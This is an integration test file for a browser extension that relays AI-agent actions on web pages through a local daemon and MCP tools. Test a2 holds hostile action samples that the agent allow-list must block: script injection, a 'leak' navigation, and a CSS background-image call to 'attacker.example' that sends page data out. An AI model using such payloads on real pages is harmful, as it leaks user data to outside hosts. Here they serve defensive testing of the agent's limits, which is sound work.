import { test, expect, chromium } from '@playwright/test';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { execFileSync } from 'node:child_process';
import { createHttpServer } from '../daemon/src/http.js';
import { attachWebSocketServer } from '../daemon/src/ws.js';
import { createPageFeedbackStore } from '../daemon/src/store.js';

const projectRoot = path.resolve(fileURLToPath(new URL('..', import.meta.url)));
const FIXTURE = 'test/fixtures/playground.html';
const TOKEN = 'integration-secret-token';

function contentType(p) {
  if (p.endsWith('.html')) return 'text/html; charset=utf-8';
  if (p.endsWith('.css')) return 'text/css; charset=utf-8';
  if (p.endsWith('.js')) return 'text/javascript; charset=utf-8';
  return 'application/octet-stream';
}

function startStaticServer() {
  return new Promise((resolve, reject) => {
    const srv = http.createServer((req, res) => {
      const url = new URL(req.url || '/', 'http://127.0.0.1');
      const requested = decodeURIComponent(url.pathname.replace(/^\/+/, '')) || FIXTURE;
      const filePath = path.resolve(projectRoot, requested);
      if (!filePath.startsWith(projectRoot + path.sep)) {
        res.writeHead(403);
        res.end('Forbidden');
        return;
      }
      fs.readFile(filePath, (err, body) => {
        if (err) {
          res.writeHead(404);
          res.end('Not found');
          return;
        }
        res.writeHead(200, { 'content-type': contentType(filePath) });
        res.end(body);
      });
    });
    srv.once('error', reject);
    srv.listen(0, '127.0.0.1', () => resolve(srv));
  });
}

async function mcpCall(port, name, args) {
  const res = await fetch(`http://127.0.0.1:${port}/mcp`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', accept: 'application/json, text/event-stream' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name, arguments: args } }),
  });
  const text = await res.text();
  const line = text.split('\n').find((l) => l.startsWith('data: '));
  return JSON.parse(line ? line.slice(6) : text).result;
}

async function getServiceWorker(context) {
  let [sw] = context.serviceWorkers();
  if (!sw) sw = await context.waitForEvent('serviceworker');
  return sw;
}

test.describe('Milestone 2 Integration', () => {
  let staticServer;
  let staticOrigin;
  let pageUrl;
  let userDataDir;
  let context;
  let daemonServer;
  let daemonPort;
  let daemonWss;
  let daemonInboxDir;
  let entryStore;

  test.beforeAll(async () => {
    // 1) Start HTTP Static Server for fixture
    staticServer = await startStaticServer();
    staticOrigin = `http://127.0.0.1:${staticServer.address().port}`;
    pageUrl = `${staticOrigin}/${FIXTURE}`;

    // 2) Start test daemon server
    daemonInboxDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bag-daemon-inbox-'));
    entryStore = createPageFeedbackStore({ inboxDir: daemonInboxDir, storageMode: 'memory' });
    daemonServer = createHttpServer({ inboxDir: daemonInboxDir, entryStore, token: TOKEN, extensionRequest: (type, params) => daemonWss.request(type, params) });
    daemonWss = attachWebSocketServer(daemonServer, { inboxDir: daemonInboxDir, entryStore, token: TOKEN });
    await new Promise((r) => daemonServer.listen(0, '127.0.0.1', r));
    daemonPort = daemonServer.address().port;

    // 3) Launch persistent Chrome context with remote debugging port 9888
    userDataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bag-m2-integration-'));
    context = await chromium.launchPersistentContext(userDataDir, {
      headless: false,
      args: [
        '--headless=new',
        `--disable-extensions-except=${projectRoot}`,
        `--load-extension=${projectRoot}`,
        '--remote-debugging-port=9888',
      ],
    });
  });

  test.afterAll(async () => {
    // Cleanup Chrome
    await context?.close().catch(() => {});
    if (userDataDir) fs.rmSync(userDataDir, { recursive: true, force: true });

    // Cleanup daemon
    if (daemonServer) {
      const closed = new Promise((r) => daemonServer.close(r));
      daemonServer.closeAllConnections?.();
      await closed;
    }
    if (daemonInboxDir) fs.rmSync(daemonInboxDir, { recursive: true, force: true });

    // Cleanup static server
    if (staticServer) {
      const closed = new Promise((r) => staticServer.close(r));
      staticServer.closeAllConnections?.();
      await closed;
    }
  });

  test('a. Action execution and result recovery via the WebSocket relay path', async () => {
    const sw = await getServiceWorker(context);

    // Seed the daemon configuration inside settings
    const wsUrl = `ws://127.0.0.1:${daemonPort}/ws`;
    await sw.evaluate(
      async ({ wsUrl, token }) => {
        await chrome.storage.local.set({
          aiAdvisorSettings: {
            daemon: {
              enabled: true,
              url: wsUrl,
              token: token,
            },
            ai: {
              provider: 'mock',
              apiKey: 'mock-key',
            }
          },
        });
      },
      { wsUrl, token: TOKEN }
    );

    // Wait for extension connection to daemon WebSocket
    await expect.poll(() => daemonWss.getBridgeStatus().connected).toBe(true);

    const page = await context.newPage();
    await page.goto(pageUrl);

    // Try to fill the input field in playground via WebSocket execution relay
    const executePromise = daemonWss.executeActions({
      actions: [
        { verb: 'fillInput', args: { selector: 'input[name="email"]', value: 'ws-relay-test@example.com' } }
      ],
      urlContains: 'playground.html'
    });

    const res = await executePromise;
    expect(res.ok).toBe(true);
    expect(res.results[0].ok).toBe(true);

    // Confirm field value on the page
    const emailVal = await page.$eval('input[name="email"]', el => el.value);
    expect(emailVal).toBe('ws-relay-test@example.com');

    await page.close();
  });

  test('a2. execute_actions is limited to the agent allow-list and never clicks purchase buttons', async () => {
    // 'a' のテストで拡張は daemon に接続済み(設定は storage に残る)。
    await expect.poll(() => daemonWss.getBridgeStatus().connected).toBe(true);
    const page = await context.newPage();
    await page.goto(pageUrl);
    await page.evaluate(() => {
      const b = document.createElement('button');
      b.id = 'buy-now';
      b.textContent = '今すぐ買う';
      b.addEventListener('click', () => { window.__bought = true; });
      document.body.append(b);
    });
    const run = (actions, extra = {}) => daemonWss.executeActions({ actions, urlContains: 'playground.html', ...extra });

    // daemon が別の経路(manual)を名乗っても、拡張は execute_actions として縛る。
    const blocked = await run(
      [
        { verb: 'injectScript', args: { code: 'window.__injected = true' } },
        { verb: 'navigateTo', args: { url: 'https://example.com/?leak=1' } },
        { verb: 'removeElement', args: { selector: '#buy-now' } },
      ],
      { source: 'manual' },
    );
    expect(blocked.results.map((r) => r.ok)).toEqual([false, false, false]);
    expect(page.url()).toBe(pageUrl);
    await expect(page.locator('#buy-now')).toHaveCount(1);

    const res = await run([
      { verb: 'setStyle', args: { selector: '#buy-now', styles: { backgroundColor: 'rgb(192, 0, 0)' } } },
      { verb: 'clickElement', args: { selector: '#buy-now' } },
    ]);
    expect(res.results[0].ok).toBe(true);
    await expect(page.locator('#buy-now')).toHaveCSS('background-color', 'rgb(192, 0, 0)');
    expect(res.results[1]).toMatchObject({ ok: false, held: true });
    expect(await page.evaluate(() => window.__bought === true)).toBe(false);

    // setStyle は見た目を直す範囲だけ。外部参照(読んだ値の持ち出し口)と、要素を重ねる・動かす・透過させるプロパティは断る。
    const styles = await run([
      { verb: 'setStyle', args: { selector: '#buy-now', styles: { backgroundImage: 'url(https://attacker.example/?d=1)' } } },
      { verb: 'setStyle', args: { selector: '#buy-now', styles: { position: 'fixed', zIndex: '9999' } } },
      { verb: 'setStyle', args: { selector: '#buy-now', styles: { opacity: '0' } } },
      { verb: 'setStyle', args: { selector: '#buy-now', styles: { marginTop: '-40px' } } },
    ]);
    expect(styles.results.map((r) => r.ok)).toEqual([false, false, false, false]);
    expect(await page.$eval('#buy-now', (el) => [el.style.backgroundImage, el.style.position, el.style.opacity, el.style.marginTop])).toEqual(['', '', '', '']);

    await page.close();
  });

  test('a3. resolve_feedback relay marks the memos done in the open tab and in storage', async () => {
    await expect.poll(() => daemonWss.getBridgeStatus().connected).toBe(true);
    const sw = await getServiceWorker(context);
    const anchor = { selector: 'input[name="email"]', tag: 'input', role: 'textbox', text: '' };
    await sw.evaluate(
      async ({ scope, anchor }) => {
        await chrome.storage.local.set({
          aiAdvisorAnnotations: {
            [scope]: [{ id: 'note-open', kind: 'note', createdAt: '2026-10-17T00:00:00Z', note: '枠を太く', intent: '', anchor }],
            'http://127.0.0.1:1/closed': [{ id: 'note-closed', kind: 'note', createdAt: '2026-10-17T00:00:00Z', note: '閉じたページ', intent: '', anchor }],
          },
        });
      },
      { scope: pageUrl.split('?')[0], anchor },
    );
    // 同じページを2つのタブで開いている。どちらも対応済みになり、古い状態で送ったり上書きしたりしない。
    const page = await context.newPage();
    await page.goto(pageUrl);
    const twin = await context.newPage();
    await twin.goto(pageUrl);
    for (const p of [page, twin]) await expect(p.locator('.bag-step-caption')).toHaveCount(1);
    const tabId = await sw.evaluate(async (u) => (await chrome.tabs.query({})).find((t) => t.url === u)?.id, pageUrl);
    // タブを開いた後に、このページへメモが増えた(別タブでの追加など)。開いているタブの一覧は古いまま。
    await sw.evaluate(
      async ({ scope, anchor }) => {
        const map = (await chrome.storage.local.get('aiAdvisorAnnotations')).aiAdvisorAnnotations;
        map[scope].push({ id: 'note-later', kind: 'note', createdAt: '2026-10-17T00:01:00Z', note: '後から', intent: '', anchor });
        await chrome.storage.local.set({ aiAdvisorAnnotations: map });
      },
      { scope: pageUrl.split('?')[0], anchor },
    );

    const res = await daemonWss.request('mark_annotations_done', { tabId, ids: ['note-open', 'note-closed'] });
    expect(res.marked.sort()).toEqual(['note-closed', 'note-open']);
    for (const p of [page, twin]) await expect(p.locator('.bag-step-caption--done')).toContainText('AI');
    const twinTabId = await sw.evaluate(async (u) => (await chrome.tabs.query({})).filter((t) => t.url === u).at(-1)?.id, pageUrl);
    const collected = await sw.evaluate((t) => chrome.tabs.sendMessage(t, { type: 'COLLECT_PAGE_FEEDBACK' }), twinTabId);
    // 対応済みのメモは送らない(後から増えた未対応のメモは送る)。
    expect(collected.items.map((i) => i.id)).toEqual(['note-later']);
    await twin.close();
    const stored = await sw.evaluate(async () => (await chrome.storage.local.get('aiAdvisorAnnotations')).aiAdvisorAnnotations);
    const all = Object.values(stored).flat();
    for (const id of ['note-open', 'note-closed']) {
      expect(all.find((a) => a.id === id)).toMatchObject({ forAI: false, doneAt: expect.any(String) });
    }
    // 古い一覧を持つタブの書き戻しで、後から増えたメモが消えない。
    expect(all.find((a) => a.id === 'note-later')).toMatchObject({ note: '後から' });
    expect(all.find((a) => a.id === 'note-later').doneAt).toBeUndefined();
    // 該当メモを持たない拡張は ok:false を返す(複数の拡張が繋がる時に、持つ側の応答を daemon に採らせる)。
    await expect(daemonWss.request('mark_annotations_done', { tabId, ids: ['missing'] })).rejects.toThrow(/No matching annotations/);

    await sw.evaluate(() => chrome.storage.local.remove('aiAdvisorAnnotations'));
    await page.close();
  });

  test('a4. MCP resolve_feedback reaches the real extension and the latest answers "handled"', async () => {
    await expect.poll(() => daemonWss.getBridgeStatus().connected).toBe(true);
    const sw = await getServiceWorker(context);
    const scope = pageUrl.split('?')[0];
    const anchor = { selector: 'input[name="email"]', tag: 'input', role: 'textbox', text: '' };
    await sw.evaluate(
      ({ scope, anchor }) =>
        chrome.storage.local.set({ aiAdvisorAnnotations: { [scope]: [{ id: 'note-mcp', kind: 'note', createdAt: '2026-10-17T00:00:00Z', note: '入力欄の枠を太く', intent: '', anchor, forAI: false }] } }),
      { scope, anchor },
    );
    const page = await context.newPage();
    await page.goto(pageUrl);
    await expect(page.locator('.bag-step-caption')).toHaveCount(1);
    const tabId = await sw.evaluate(async (u) => (await chrome.tabs.query({})).find((t) => t.url === u)?.id, pageUrl);
    // 人が「AIに渡す」にチェック → daemon ON なのでメモだけが画像なしで同期される。
    await sw.evaluate((t) => chrome.tabs.sendMessage(t, { type: 'SET_ANNOTATION_FOR_AI', id: 'note-mcp', on: true }, { frameId: 0 }), tabId);
    const mcp = (name, args) => mcpCall(daemonPort, name, args);
    let ctx;
    await expect.poll(async () => (ctx = await mcp('get_latest_feedback_context', { tabId }))?.structuredContent?.id || '', { timeout: 15000 }).not.toBe('');
    expect(JSON.stringify(ctx.content)).toContain('入力欄の枠を太く');

    const resolved = await mcp('resolve_feedback', { id: ctx.structuredContent.id, summary: '枠を 2px にした' });
    expect(resolved.structuredContent.extension).toEqual({ marked: ['note-mcp'], missing: [] });
    await expect(page.locator('.bag-step-caption--done')).toContainText('AI');
    const stored = await sw.evaluate(async (s) => (await chrome.storage.local.get('aiAdvisorAnnotations')).aiAdvisorAnnotations[s][0], scope);
    expect(stored).toMatchObject({ forAI: false, doneAt: expect.any(String) });
    // 同じメモに二度対応させない: latest は中身を返さず「対応済み」と答え、top-level に id を載せない。
    const again = await mcp('get_latest_feedback_context', { tabId });
    expect(again.content[0].text).toContain('対応済み');
    expect(again.structuredContent.id).toBeUndefined();

    await sw.evaluate(() => chrome.storage.local.remove('aiAdvisorAnnotations'));
    await page.close();
  });

  test('a5. MCP runs a saved workflow in a new tab and stops at the confirm step for a person', async () => {
    await expect.poll(() => daemonWss.getBridgeStatus().connected).toBe(true);
    const sw = await getServiceWorker(context);
    const mcp = (name, args) => mcpCall(daemonPort, name, args);
    const steps = [
      { id: 'w1', kind: 'action', url: pageUrl, target: 'メールアドレス', action: { verb: 'fill', value: '{email}' }, locator: { kind: 'fixed', anchor: { selector: 'input[name="email"]', tag: 'input' } } },
      { id: 'w2', kind: 'action', url: pageUrl, target: '購入手続きへ', action: { verb: 'click', value: '' }, locator: { kind: 'fixed', anchor: { selector: '[data-testid="cta-checkout"]', tag: 'button', role: 'button', text: '購入手続きへ' } }, gate: true },
    ];
    const saved = { id: 'wf-mcp', name: 'メール入力→購入', createdAt: '2026-10-17T00:00:00Z', steps };
    const seed = (working) => sw.evaluate(({ saved, working }) => chrome.storage.local.set({ aiAdvisorWorkflow: { recording: false, activeId: saved.id, name: saved.name, steps: working, saved: [saved] }, aiAdvisorWorkflowRun: null }), { saved, working });

    // 保存済みも実行も無いプロファイルは答えない(複数のプロファイルが繋がっても、該当するものの答えが採られる)。
    await sw.evaluate(() => chrome.storage.local.remove(['aiAdvisorWorkflow', 'aiAdvisorWorkflowRun']));
    expect((await mcp('list_workflows', {})).content[0].text).toMatch(/No saved workflows/);
    expect((await mcp('stop_workflow', {})).content[0].text).toMatch(/No workflow run in progress/);

    await seed(steps);
    const list = await mcp('list_workflows', {});
    expect(list.structuredContent.workflows).toEqual([
      { id: 'wf-mcp', name: 'メール入力→購入', createdAt: '2026-10-17T00:00:00Z', steps: 2, confirmSteps: 1, variables: ['email'], startPage: pageUrl },
    ]);
    // サイドパネルの未保存の手順は置き換えない(人が保存か破棄を選ぶ)。
    await seed(steps.slice(0, 1));
    const refused = await mcp('run_workflow', { workflowId: 'wf-mcp', vars: { email: 'mcp@example.com' } });
    expect(refused.isError).toBe(true);
    expect(refused.content[0].text).toMatch(/unsaved working steps/);

    // 変数が足りなければ、タブを開く前・作業中の手順を置き換える前に断る。
    await seed(steps);
    const pagesBefore = context.pages().length;
    const noVars = await mcp('run_workflow', { workflowId: 'wf-mcp', vars: {} });
    expect(noVars.isError).toBe(true);
    expect(noVars.content[0].text).toMatch(/Missing values for: email/);
    expect(context.pages().length).toBe(pagesBefore);

    const opened = context.waitForEvent('page');
    const run = await mcp('run_workflow', { workflowId: 'wf-mcp', vars: { email: 'mcp@example.com' } });
    expect(run.structuredContent).toMatchObject({ started: true, workflow: { id: 'wf-mcp' } });
    const tab = await opened;
    let status;
    await expect.poll(async () => (status = (await mcp('get_workflow_run', {})).structuredContent.run).held?.kind || '', { timeout: 20000 }).toBe('confirm');
    expect(status).toMatchObject({ active: false, workflowId: 'wf-mcp', tabId: run.structuredContent.tabId, done: 1, total: 2, complete: false, held: { step: 2 } });
    await expect(tab.locator('input[name="email"]')).toHaveValue('mcp@example.com');
    // 状態に入力値や手順の文面を載せない(直近の出来事は種類と時刻だけ)。
    expect(Object.keys(status.last).sort()).toEqual(['at', 'phase']);
    expect(JSON.stringify(status)).not.toContain('mcp@example.com');
    // 確定系の手順を承認する手段は MCP に無い。止めると承認待ちも消える。
    const stopped = await mcp('stop_workflow', {});
    expect(stopped.structuredContent.run).toMatchObject({ active: false, held: null });

    await sw.evaluate(() => chrome.storage.local.remove(['aiAdvisorWorkflow', 'aiAdvisorWorkflowRun']));
    await tab.close();
  });

  test('a6. An alarm reconnects to the daemon even when the 5-second retry timer is gone', async () => {
    const sw = await getServiceWorker(context);
    await expect.poll(() => daemonWss.getBridgeStatus().connected).toBe(true);
    const alarm = await sw.evaluate(() => chrome.alarms.get('bag-daemon-reconnect'));
    expect(alarm?.periodInMinutes).toBe(0.5);

    // The retry timer dies with the SW while the daemon is down; here the alarm has to beat its 5 seconds.
    const before = daemonWss.getBridgeStatus().lastConnectedAt;
    for (const client of daemonWss.clients) client.terminate();
    await expect.poll(() => daemonWss.getBridgeStatus().connected).toBe(false);
    // Unpacked extensions may fire alarms sooner than the 30-second minimum.
    await sw.evaluate(() => chrome.alarms.create('bag-daemon-reconnect', { when: Date.now() + 100 }));
    await expect
      .poll(() => daemonWss.getBridgeStatus().lastConnectedAt !== before && daemonWss.getBridgeStatus().connected, { timeout: 3500 })
      .toBe(true);
    expect(daemonWss.clients.size).toBe(1);
    // The one-shot alarm is gone once it fires; the reconnect puts the periodic one back.
    await expect.poll(() => sw.evaluate(() => chrome.alarms.get('bag-daemon-reconnect').then((a) => a?.periodInMinutes))).toBe(0.5);
  });

  test('b. Action execution and result recovery via the fallback CDP bridge CLI', async () => {
    const sw = await getServiceWorker(context);
    const extId = new URL(sw.url()).hostname;
    const optionsPage = await context.newPage();
    await optionsPage.goto(`chrome-extension://${extId}/options/options.html`);

    const page = await context.newPage();
    await page.goto(pageUrl);

    // Reset email value
    await page.fill('input[name="email"]', '');

    const cdpBridgePath = path.join(projectRoot, 'scripts/cdp-bridge.mjs');
    const actionsJson = JSON.stringify([
      { verb: 'fillInput', args: { selector: 'input[name="email"]', value: 'cdp-bridge-test@example.com' } }
    ]);

    let stdout;
    try {
      stdout = execFileSync('node', [
        cdpBridgePath,
        '--port', '9888',
        '--urlContains', 'playground.html',
        '--json',
        actionsJson
      ], { encoding: 'utf8' });
    } catch (err) {
      console.error('execFileSync failed!');
      console.error('stdout:', err.stdout);
      console.error('stderr:', err.stderr);
      throw err;
    }

    const response = JSON.parse(stdout);
    expect(response.results).toBeDefined();
    expect(response.results[0].ok).toBe(true);

    // Confirm field value on page
    await expect(page.locator('input[name="email"]')).toHaveValue('cdp-bridge-test@example.com');

    await page.close();
    await optionsPage.close();
  });

  test('c. Clipboard Hook: copied text is kept out of the page context and returned only by readSignals', async () => {
    const page = await context.newPage();
    await page.goto(pageUrl);

    // Evaluate copy action in the page context (MAIN world) to trigger clipboard hook
    await page.evaluate(async () => {
      await navigator.clipboard.writeText('copied-by-hook-test-content');
    });

    const sw = await getServiceWorker(context);
    const send = (msg) =>
      sw.evaluate(async (m) => {
        const [tab] = await chrome.tabs.query({ active: true });
        return chrome.tabs.sendMessage(tab.id, m);
      }, msg);

    // The chat prompt and the export text are built from these; the copied text must not reach them automatically.
    const ctx = await send({ type: 'COLLECT_CONTEXT' });
    expect(JSON.stringify(ctx)).not.toContain('copied-by-hook-test-content');
    const exported = await send({ type: 'EXPORT_CONTEXT' });
    expect(exported.text).not.toContain('copied-by-hook-test-content');

    // An agent that explicitly asks for it (readSignals, e.g. via execute_actions) still gets it.
    await expect
      .poll(async () => {
        const res = await send({ type: 'RUN_ACTIONS', actions: [{ verb: 'readSignals', args: {} }], source: 'execute_actions' });
        return JSON.stringify(res);
      })
      .toContain('copied-by-hook-test-content');

    await page.close();
  });
});
